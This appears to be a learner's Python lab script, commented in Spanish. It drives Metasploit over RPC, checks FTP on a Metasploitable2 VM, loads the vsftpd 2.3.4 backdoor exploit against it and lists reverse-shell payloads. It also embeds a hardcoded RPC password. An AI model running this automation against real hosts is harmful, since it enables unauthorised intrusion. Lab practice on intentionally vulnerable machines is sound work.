#!/usr/bin/env python3
from pymetasploit3.msfrpc import MsfRpcClient
import sys
import time
import subprocess

def verificar_msfrpcd():
    """Verificar si msfrpcd está corriendo"""
    try:
        result = subprocess.run(['pgrep', '-f', 'msfrpcd'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ msfrpcd está corriendo")
            return True
        else:
            print("❌ msfrpcd NO está corriendo")
            return False
    except:
        return False
    

if __name__ == "__verificarmsfrpcd__":
    verificar_msfrpcd()    

def main():
    print("="*50)
    print("TEST DE CONEXIÓN METASPLOIT")
    print("="*50)
    
    password = "123chivaS?"
    
    print(f"\n🔍 Contraseña configurada: {'*' * len(password)}")
    print("🔄 Intentando conectar a Metasploit RPC...")
  
  

    try:
        # Intentar conexión (ajusta estos valores)
        client = MsfRpcClient(
            password=password,
            port=55552,        # Puerto que estás usando
            ssl=False,         # Cambiar a True si usas SSL
            timeout=10,
        )
        
        if client.authenticated:
            print("✅ CONEXIÓN EXITOSA!")
            print(f"\n📊 ESTADÍSTICAS:")
            print(f"  - Exploits: {len(client.modules.exploits)}")
            print(f"  - Payloads: {len(client.modules.payloads)}")
            print(f"  - Auxiliares: {len(client.modules.auxiliary)}")
            print(f"  - Post: {len(client.modules.post)}")
            
            #navegar sobre el framework
            #[m for m in dir(client) if not m.startswith('_')]
            #print(client)


            # Probar listado rápido  #solo 5 exploits
            print("\n🔍 PRIMEROS 5 EXPLOITS:") 
            for i, exploit in enumerate(client.modules.exploits[:5]):
                print(f"  {i+1}. {exploit}")
        else:
            print("❌ Error de autenticación")
   
    except Exception as e:
        print(f"❌ ERROR: {type(e).__name__}: {e}")
        print("\n💡 POSIBLES CAUSAS:")
        print("1. ¿msfrpcd está corriendo?")
        print("   → ps aux | grep msfrpcd")
        print("2. ¿Puerto correcto? (55552)")
        print("3. ¿SSL configurado correctamente? (False)")
        print("4. ¿Contraseña correcta? (123chivaS?)")
        
        print("\n🔧 Para iniciar msfrpcd:")
        print("   sudo msfrpcd -P 123chivaS? -S false -p 55552")
    #crear exploits
    # Payloads que suelen funcionar en sistemas Unix/Linux
    payloads_comunes = [
    'cmd/unix/reverse',            # Shell reversa
    #'cmd/unix/bind_perl',         # Bind shell con Perl
    #'cmd/unix/reverse_perl',      # Reverse shell con Perl
    #'cmd/unix/bind_netcat',       # Bind shell con netcat
    #'cmd/unix/reverse_netcat',    # Reverse shell con netcat
    #'cmd/unix/bind_python',       # Bind con Python
    #'cmd/unix/reverse_python',    # Reverse con Python
]

    #def payloads ():
     #   print('Payloads compatibles! :')
      #  for payload in exploit.targetpayloads():
       #     print("f  - {payload}")
    #payloads()       

    def verificationIP():
        IP_METASPLOITABLE2 = "192.168.34.5"
        IP_UBUNTU = "192.168.34.160"

        try:
            #verificar conexion con metasploitable2
            print(f"\n📡 Verificando conectividad con {IP_METASPLOITABLE2}...")
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((IP_METASPLOITABLE2, 21))
            sock.close()
        
            if result == 0:
                print(f"✅ Puerto 21 abierto en {IP_METASPLOITABLE2}")
            else:
                print(f"❌ Puerto 21 cerrado en {IP_METASPLOITABLE2}")
                print("   ¿Metasploitable está encendido y tiene la IP correcta?")
                print("   Verifica con: ping", IP_METASPLOITABLE2)
                return
            
            #cargar exploit
            print("\n cargando exploit vsftpd_234_backdoor...")
            exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
            #mostrar informacion
            print(f"\n📋 DESCRIPCIÓN:")
            print(f"   {exploit.description[:150]}...")
        
              
            # Configurar
            print("\n⚙️ CONFIGURANDO:")
            exploit['RHOSTS'] = IP_METASPLOITABLE2
            print(f"   RHOSTS = {IP_METASPLOITABLE2}")
        
            # Ver payloads compatibles
            print("\n🎯 PAYLOADS COMPATIBLES (primeros 5):")
            payloads = exploit.targetpayloads()
            for i, p in enumerate(payloads[:5]):
                print(f"   {i+1}. {p}")
        
        except Exception as e:
            print(f"❌ ERROR: {type(e).__name__}: {e}")
    verificationIP()

if __name__ == "__main__":
    main()
    